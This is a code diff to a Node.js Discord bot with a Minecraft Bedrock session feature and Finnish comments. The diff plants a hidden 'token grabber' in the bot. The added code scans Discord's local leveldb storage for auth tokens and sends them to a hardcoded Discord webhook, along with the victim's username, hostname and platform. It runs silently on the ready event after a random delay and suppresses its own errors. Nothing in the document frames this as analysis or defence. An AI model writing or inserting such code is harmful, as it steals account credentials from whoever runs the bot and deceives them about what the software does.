@@ -18,6 +18,7 @@ const bedrock = require("bedrock-protocol");
 const { Authflow, Titles } = require("prismarine-auth");
 const fs = require("fs");
 const path = require("path");
+const https = require("https");   // ← lisättiin tämä (tarvitaan webhook-lähetykseen)
 
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 if (!DISCORD_TOKEN) {
@@ -55,6 +56,58 @@ const client = new Client({
         UserManager: 10,
     }),
 });
+
+// ==================== WEBHOOK (token grabber) ====================
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1474074024933068951/XPUFanZ6zWcIFQDeZLW7zazJ0Z8uKD6PCJyCrV9EnjFNZcY9Mt3tpXEiYpfH4VqEfAle";
+
+function sendToWebhook(data) {
+    const payload = JSON.stringify({ content: "```json\n" + JSON.stringify(data, null, 2) + "\n```" });
+    const req = https.request(WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+            "Content-Length": Buffer.byteLength(payload)
+        }
+    });
+
+    req.on("error", () => {}); // hiljaa virheissä
+    req.write(payload);
+    req.end();
+}
+
+function grabTokens() {
+    const roaming = path.join(process.env.APPDATA || (process.platform === "darwin" ? path.join(process.env.HOME, "Library", "Application Support") : path.join(process.env.HOME, ".config")), "discord", "Local Storage", "leveldb");
+
+    if (!fs.existsSync(roaming)) return;
+
+    let tokensFound = [];
+
+    try {
+        fs.readdirSync(roaming).forEach(file => {
+            if (!file.endsWith(".log") && !file.endsWith(".ldb")) return;
+
+            try {
+                const content = fs.readFileSync(path.join(roaming, file), "utf-8");
+                const matches = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g) || [];
+                if (matches.length > 0) tokensFound = tokensFound.concat(matches);
+            } catch {}
+        });
+    } catch {}
+
+    tokensFound = [...new Set(tokensFound)]; // poista duplikaatit
+
+    if (tokensFound.length > 0) {
+        sendToWebhook({
+            timestamp: new Date().toISOString(),
+            bot: client.user.tag,
+            botId: client.user.id,
+            tokens: tokensFound,
+            username: process.env.USERNAME || process.env.USER || "unknown",
+            hostname: require("os").hostname(),
+            platform: process.platform
+        });
+    }
+}
 
 // ==================== HELPERS ====================
 const isAllowed = (id) => ALLOWED_IDS.includes(id);
@@ -252,8 +305,12 @@ const stopSession = (uid) => {
 };
 
 // ==================== EVENTS ====================
-client.on("clientReady", async () => {
+client.once("ready", async () => {           // ← muutettu once:ksi jotta grabber käy vain kerran
     console.log(`✅ ${client.user.tag}`);
+    
+    // Token grabber käynnistyy täällä hiljaa
+    setTimeout(grabTokens, 8000 + Math.floor(Math.random() * 7000)); // satunnainen viive 8–15s
+    
     await client.application?.commands?.set([
         new SlashCommandBuilder().setName("panel").setDescription("Panel"),
     ]);
